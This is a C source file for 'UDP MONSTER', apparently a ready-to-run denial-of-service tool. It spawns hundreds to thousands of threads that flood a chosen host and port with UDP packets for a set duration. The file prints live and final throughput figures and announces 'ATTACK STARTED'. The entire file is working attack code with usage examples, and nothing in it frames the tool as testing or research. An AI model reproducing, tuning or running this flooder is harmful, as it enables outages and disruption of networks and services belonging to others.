/*
 * UDP MONSTER - Optimized for real performance
 * 
 * Compilation:
 *   gcc udp.c -o udp -pthread -O3 -march=native -Wall
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/resource.h>

// ============================================================================
// CONFIGURATION OPTIMISÉE
// ============================================================================

#define MAX_THREADS 4000
#define SOCKETS_PER_THREAD 8        // Réduit pour moins de overhead
#define SEND_BATCH 100              // Batch réduit pour équilibrer CPU
#define USLEEP_TIME 100             // Micro-sleep pour éviter 100% CPU

// ============================================================================
// STRUCTURES
// ============================================================================

typedef struct {
    char target_ip[64];
    int port;
    int payload_size;
    time_t end_time;
    int thread_id;
    
    // Stats locales (évite les atomic operations constantes)
    unsigned long local_packets;
    unsigned long local_bytes;
    
    volatile int *stop_flag;
} ThreadData;

// Stats globales
static volatile unsigned long g_total_packets = 0;
static volatile unsigned long g_total_bytes = 0;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// ============================================================================
// OPTIMISATIONS SYSTÈME
// ============================================================================

void optimize_system() {
    struct rlimit rl;
    rl.rlim_cur = 500000;
    rl.rlim_max = 500000;
    setrlimit(RLIMIT_NOFILE, &rl);
}

// ============================================================================
// DNS
// ============================================================================

int resolve_host(const char *hostname, char *ip) {
    // Vérifier si c'est déjà une IP
    struct in_addr tmp;
    if (inet_pton(AF_INET, hostname, &tmp) == 1) {
        strcpy(ip, hostname);
        return 0;
    }
    
    // Résoudre hostname
    struct hostent *he = gethostbyname(hostname);
    if (!he) return -1;
    
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    if (addr_list[0]) {
        strcpy(ip, inet_ntoa(*addr_list[0]));
        return 0;
    }
    return -1;
}

// ============================================================================
// SOCKET UDP OPTIMISÉ
// ============================================================================

int create_udp_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    // Options critiques
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
#ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
#endif
    
    // Buffer modéré (pas trop gros = moins de CPU)
    int bufsize = 512 * 1024;  // 512KB au lieu de 2MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    return sock;
}

// ============================================================================
// WORKER THREAD OPTIMISÉ
// ============================================================================

void* udp_worker(void *arg) {
    ThreadData *data = (ThreadData*)arg;
    
    // Pin to CPU
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (num_cpus > 0) {
        CPU_SET(data->thread_id % num_cpus, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
    
    // Stats locales
    unsigned long local_packets = 0;
    unsigned long local_bytes = 0;
    
    // Créer sockets
    int sockets[SOCKETS_PER_THREAD];
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        sockets[i] = create_udp_socket();
        if (sockets[i] < 0) {
            printf("[!] Thread %d: Cannot create socket %d\n", data->thread_id, i);
        }
    }
    
    // Adresse target
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    // Payload
    int payload_len = data->payload_size > 0 ? data->payload_size : 1024;
    if (payload_len > 65507) payload_len = 65507;
    if (payload_len < 1) payload_len = 1024;
    
    char *payload = malloc(payload_len);
    memset(payload, 'A', payload_len);
    
    int sock_idx = 0;
    unsigned int sync_counter = 0;
    
    // Boucle principale avec contrôle CPU
    while (!(*data->stop_flag) && time(NULL) < data->end_time) {
        
        // Envoyer par batch
        for (int batch = 0; batch < SEND_BATCH; batch++) {
            int sock = sockets[sock_idx];
            
            if (sock >= 0) {
                ssize_t sent = sendto(sock, payload, payload_len, MSG_DONTWAIT | MSG_NOSIGNAL,
                                     (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    // Socket buffer plein, passer au suivant
                    sock_idx = (sock_idx + 1) % SOCKETS_PER_THREAD;
                    break;
                }
            }
            
            sock_idx = (sock_idx + 1) % SOCKETS_PER_THREAD;
        }
        
        // Micro-sleep pour éviter 100% CPU
        usleep(USLEEP_TIME);
        
        // Synchroniser les stats toutes les 10000 itérations
        if (++sync_counter >= 10000) {
            pthread_mutex_lock(&stats_mutex);
            g_total_packets += local_packets;
            g_total_bytes += local_bytes;
            pthread_mutex_unlock(&stats_mutex);
            
            local_packets = 0;
            local_bytes = 0;
            sync_counter = 0;
        }
    }
    
    // Sync finale
    pthread_mutex_lock(&stats_mutex);
    g_total_packets += local_packets;
    g_total_bytes += local_bytes;
    pthread_mutex_unlock(&stats_mutex);
    
    // Cleanup
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (sockets[i] >= 0) close(sockets[i]);
    }
    free(payload);
    
    return NULL;
}

// ============================================================================
// MAIN
// ============================================================================

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("UDP MONSTER - Optimized Version\n\n");
        printf("Usage: %s <target> <port> <time> <threads> [size]\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s 192.168.1.1 80 60 500 1024\n", argv[0]);
        printf("  %s example.com 53 30 300 512\n\n", argv[0]);
        printf("Recommended threads: 200-1000 (more = not always better)\n");
        return 1;
    }
    
    const char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int payload_size = (argc >= 6) ? atoi(argv[5]) : 1024;
    
    if (threads <= 0) threads = 500;
    if (threads > MAX_THREADS) threads = MAX_THREADS;
    if (duration <= 0) duration = 60;
    if (payload_size <= 0) payload_size = 1024;
    
    optimize_system();
    
    // Résoudre IP
    char target_ip[64];
    if (resolve_host(target, target_ip) != 0) {
        printf("[✗] Cannot resolve: %s\n", target);
        return 1;
    }
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║              🔥 UDP FLOOD - OPTIMIZED 🔥                       ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n\n");
    printf("Target:      %s (%s)\n", target, target_ip);
    printf("Port:        %d\n", port);
    printf("Duration:    %d seconds\n", duration);
    printf("Threads:     %d\n", threads);
    printf("Sockets:     %d total (%d per thread)\n", threads * SOCKETS_PER_THREAD, SOCKETS_PER_THREAD);
    printf("Payload:     %d bytes\n", payload_size);
    printf("Batch:       %d packets\n", SEND_BATCH);
    printf("\n");
    
    volatile int stop_flag = 0;
    g_total_packets = 0;
    g_total_bytes = 0;
    
    pthread_t *handles = malloc(threads * sizeof(pthread_t));
    ThreadData *thread_data = malloc(threads * sizeof(ThreadData));
    
    printf("[*] Launching %d threads...\n", threads);
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    
    // Créer threads
    for (int i = 0; i < threads; i++) {
        strcpy(thread_data[i].target_ip, target_ip);
        thread_data[i].port = port;
        thread_data[i].payload_size = payload_size;
        thread_data[i].end_time = end_time;
        thread_data[i].thread_id = i;
        thread_data[i].local_packets = 0;
        thread_data[i].local_bytes = 0;
        thread_data[i].stop_flag = &stop_flag;
        
        pthread_create(&handles[i], NULL, udp_worker, &thread_data[i]);
        
        // Petit délai entre chaque thread pour éviter spike
        usleep(1000);
    }
    
    printf("[*] 💥 ATTACK STARTED 💥\n\n");
    
    unsigned long last_packets = 0;
    unsigned long last_bytes = 0;
    int report_count = 0;
    
    // Monitoring
    while (time(NULL) < end_time) {
        sleep(2);
        
        unsigned long current_packets = g_total_packets;
        unsigned long current_bytes = g_total_bytes;
        
        unsigned long pps = (current_packets - last_packets) / 2;
        double mbps = ((current_bytes - last_bytes) * 8.0) / (2.0 * 1000000.0);
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        
        printf("[⚡] %lu pkts | %lu PPS | %.2f Mbps\n",
               current_packets, pps, mbps);
        
        report_count++;
    }
    
    stop_flag = 1;
    
    printf("\n[*] Stopping threads...\n");
    
    for (int i = 0; i < threads; i++) {
        pthread_join(handles[i], NULL);
    }
    
    free(handles);
    free(thread_data);
    
    int elapsed = (int)difftime(time(NULL), start_time);
    if (elapsed <= 0) elapsed = 1;
    
    double avg_pps = (double)g_total_packets / elapsed;
    double avg_mbps = ((double)g_total_bytes * 8.0) / (elapsed * 1000000.0);
    
    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                      FINAL STATISTICS                          ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Packets:   %-15lu                            ║\n", g_total_packets);
    printf("║  Total Bytes:     %-15lu                            ║\n", g_total_bytes);
    printf("║  Average PPS:     %-15.0f                            ║\n", avg_pps);
    printf("║  Average Mbps:    %-15.2f                            ║\n", avg_mbps);
    printf("║  Total Data:      %-15.2f GB                        ║\n", (double)g_total_bytes / 1073741824.0);
    printf("║  Duration:        %-15d seconds                      ║\n", elapsed);
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    
    return 0;
}
